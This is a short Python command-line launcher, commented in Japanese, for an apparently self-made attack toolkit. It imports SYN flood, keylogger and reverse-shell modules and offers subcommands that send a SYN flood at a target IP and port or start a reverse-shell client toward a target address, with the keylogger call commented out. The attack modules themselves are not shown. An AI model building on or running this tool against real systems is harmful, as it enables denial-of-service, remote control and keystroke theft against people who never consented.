import sys
# pychacheを作成しない
#sys.dont_write_bytecode = True
from dos import syn_flood
from keylogger import keylogger
from reverceshell import client
import argparse
   
def main():
    psr = argparse.ArgumentParser(prog="プログラムの名前", usage="使い方", description="説明", add_help=True)
    sub_psr = psr.add_subparsers(dest='subcommand')
    
    # synflood コマンドの parser を作成
    parser_synflood = sub_psr.add_parser('synflood', help='see `synflood -h`')
    parser_synflood.add_argument('target', help='target ip address')
    parser_synflood.add_argument('-p', '--port', help='target port')
    
    # reverceshell コマンドの parser を作成
    parser_reverceshell_client = sub_psr.add_parser('rs-client', help='see `rs-client -h`')
    parser_reverceshell_client.add_argument('target', help='target ip address')
    
    args = psr.parse_args()
    
    # サブコマンドが synflood の場合
    if args.subcommand == 'synflood':
        # -p オプションがない場合、デフォルトで80ポート指定
        if not args.port:
            args.port = 80
        # SYN Flood攻撃
        syn_flood.syn_flood_attack(args.target, args.port)
    # サブコマンドが rs-client の場合(reverceshell)
    elif args.subcommand == 'rs-client':
        # client 要求
        client.client(args.target)
            
    # キーロガー
    #keylogger.keylogger()
    
if __name__ == "__main__":
    main()
